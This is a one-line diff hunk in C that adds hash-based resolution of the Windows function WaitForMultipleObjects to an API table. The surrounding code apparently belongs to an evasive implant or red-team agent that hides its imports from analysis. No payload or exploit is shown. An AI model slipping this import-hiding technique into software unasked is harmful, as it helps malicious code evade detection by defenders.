@@ -277,6 +277,7 @@ BOOL Win32ApiInit(PWin32Api pApi)
     pApi->pfnCreatePipe = (fnCreatePipe)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATEPIPE_HASH);
     pApi->pfnGetStdHandle = (fnGetStdHandle)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETSTDHANDLE_HASH);
     pApi->pfnWaitForSingleObject = (fnWaitForSingleObject)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_WAITFORSINGLEOBJECT_HASH);
+    pApi->pfnWaitForMultipleObjects = (fnWaitForMultipleObjects)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_WAITFORMULTIPLEOBJECTS_HASH);
     pApi->pfnGetExitCodeProcess = (fnGetExitCodeProcess)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETEXITCODEPROCESS_HASH);
     pApi->pfnFlushFileBuffers = (fnFlushFileBuffers)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_FLUSHFILEBUFFERS_HASH);
     pApi->pfnSetEndOfFile = (fnSetEndOfFile)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_SETENDOFFILE_HASH);
